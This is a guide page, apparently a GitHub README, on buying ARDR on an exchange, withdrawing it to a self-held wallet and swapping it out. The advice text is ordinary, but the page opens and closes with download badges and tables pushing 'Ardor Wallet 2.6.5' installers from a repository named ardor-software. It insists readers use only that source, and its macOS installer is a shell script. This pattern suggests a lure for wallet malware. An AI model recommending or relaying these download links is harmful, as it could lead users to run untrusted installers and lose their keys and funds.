![Ardor Wallet guide](assets/banner-article.png)

# How to buy ARDR, move it into your own wallet, and swap out

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Buying ARDR means buying it on an exchange that lists it, then withdrawing it to an address your own wallet controls. Buying and leaving it on the exchange are different decisions with different risks, and the wallet step is the one that turns a claim on an exchange into an asset you actually hold.

## Where ARDR is sold

[ARDR](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md) trades on a handful of centralised exchanges, and the list changes as venues add or drop pairs. Rather than naming one, check two things before you deposit anything: that the exchange lists ARDR against a pair you can fund, and that withdrawals to an external address are open for that asset.

An [exchange](https://github.com/ardor-software/ardor-wallet-guides/blob/main/send-ardr-from-ardor-wallet-to-an-exchange.md) that lists a market but has withdrawals paused is not a place to buy and withdraw on the same day. Check the withdrawal status first, because that is the step people discover too late.

## Before you buy

1. Decide how much you are moving and complete the exchange's verification requirements, which usually gate withdrawals rather than deposits.
2. Have your own wallet installed and an [account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) created, with the secret written down and tested.
3. Copy your receiving address from the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) itself, not from a note, a chat or an old screenshot.
4. Check whether the exchange needs a memo or message field for this asset, and if it does, read its instructions for that exact field.

Step four catches most of the missing-deposit cases later on. A transfer that needs a memo and does not carry one arrives at the exchange but is not credited to you, and recovering it depends entirely on the exchange's support process.

## Buy and withdraw, step by step

1. Fund the exchange with whatever it accepts, then place the buy order for ARDR.
2. Wait for the trade to settle and the balance to appear in the spot account rather than an open order.
3. Open the withdrawal form for ARDR and paste the address copied from your wallet.
4. Enter the amount, keeping enough back to cover the withdrawal fee.
5. Send a small test amount first if the venue allows it, confirm it lands in your wallet, then send the rest.
6. Check the transaction on the exchange's side and in your wallet, and keep the transaction ID.

The test send costs one fee and removes almost every way a large transfer goes wrong: wrong address, wrong chain, wrong memo, or a withdrawal form that quietly defaults to an internal transfer.

## What ARDR is not bought for

ARDR is the parent chain token that pays fees and carries forging weight. It is not a staking product and it pays no dividend, so a purchase made on the expectation of a yield is based on something the protocol does not do. Forging earns transaction fees in the blocks a node produces, which is a different mechanism with a different risk profile.

Nothing here is a price view or a recommendation. The mechanics of buying, moving and holding are what this page covers: where the asset is sold, how it reaches an address you control, and what to do when a venue changes its withdrawal rules.

## Swapping out to BTC or ETH

Moving from ARDR to another asset usually means selling on an exchange rather than swapping inside the wallet, because the wallet's built-in exchange trades child chain tokens and ARDR within the platform rather than bridging to other chains.

The order is the reverse of buying: send ARDR from your wallet to the exchange's deposit address, wait for the credit, sell the pair you want, then withdraw the other asset to an address you control. Each step has its own confirmation time, and the deposit step is the one where a wrong address is unrecoverable.

## Keeping it after the buy

Once ARDR is in your wallet, the work shifts from buying to keeping. Write the secret down properly, announce the public key on an account that has never sent, and consider a hardware device once the balance is large enough that a lost laptop would matter.

Leaving the balance on the exchange is a choice, not an oversight, and it should be a deliberate one. The exchange holds the keys in that arrangement, which means its withdrawal policy, its solvency and its account security become yours.

The habit that survives both arrangements is the test send. A small transfer before a large one costs a single fee and catches the four mistakes that matter - wrong address, wrong chain, missing memo, and a form that silently defaults to an internal transfer.

## FAQ

### Do I need ARDR to use the Ardor platform?

Only for parent chain fees, forging and leasing. Child chain transactions can be paid in the child chain's token, with a bundler covering the ARDR fee.

### Can I buy ARDR with a card directly into my wallet?

Not from the wallet itself. Card purchases happen on an exchange or a broker, and the asset is then withdrawn to your address.

### Why did my deposit not arrive at the exchange?

Usually a missing memo, a wrong chain, or a withdrawal that was sent as an internal transfer. The exchange's support process is the only route, and it needs the transaction ID.

### Is it safe to keep ARDR on an exchange?

It is a custodial arrangement: the exchange controls the keys. That may be acceptable for a balance you are actively trading, and it is a poor fit for a long-term holding.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What the ARDR token is, what it pays for, and what its fixed supply means](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md)
- [Send ARDR to an exchange, clear a malformed recipient, and trace a missing deposit](https://github.com/ardor-software/ardor-wallet-guides/blob/main/send-ardr-from-ardor-wallet-to-an-exchange.md)
- [Where to store ARDR: wallet, hardware or exchange](https://github.com/ardor-software/ardor-wallet-guides/blob/main/store-ardr-in-the-ardor-wallet.md)
- [Create an Ardor account and read its address](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
